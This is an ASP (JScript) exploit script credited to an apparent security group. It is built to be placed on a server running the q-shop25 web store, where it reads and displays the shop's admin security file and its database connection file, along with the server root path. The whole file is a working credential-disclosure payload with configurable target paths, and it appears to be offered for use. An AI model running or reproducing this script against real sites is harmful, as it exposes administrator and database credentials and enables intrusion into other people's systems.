// 1ndonesian Security Team
// http://bosen.net/releases/
//
// bosen.asp
// Do server side file reading and dump it to the web as a text file.
//
<% @ Language = JScript %>
<%
function WinPath(absPath) {this.absolutePath = absPath;}
function getAbsPath() {return this.absolutePath;}
WinPath.prototype.getAbsolutePath = getAbsPath;

function fileRead(file) {
  var FSO = new ActiveXObject("Scripting.FileSystemObject"), strOut = ""
  var tmp = file, f, g = FSO.GetFile(tmp);
  f = FSO.OpenTextFile(tmp, 1, false);
  strOut = "<PRE STYLE=\"font-size:9pt;\">";
  strOut+= Server.HTMLEncode(f.ReadAll());
  strOut+= "</pre>";
  f.Close();
  return(strOut);
}

var a = new WinPath(Server.Mappath("/"));
var curDir   = a.getAbsolutePath();

// You can change these
var admin = curDir + "\\q-shop25\\admin\\security.asp";
var db = curDir + "\\q-shop25\\inc\\conx.asp";

with (Response) {
  Write("<b>ServerRoot : "+curDir+"<br></b>");
  Write("<b>Admin Info : "+admin+"<br><br></b>");
  Write(fileRead(admin));
  Write("<b>DB Info : "+db+"<br><br></b>");
  Write(fileRead(db));
}
%>
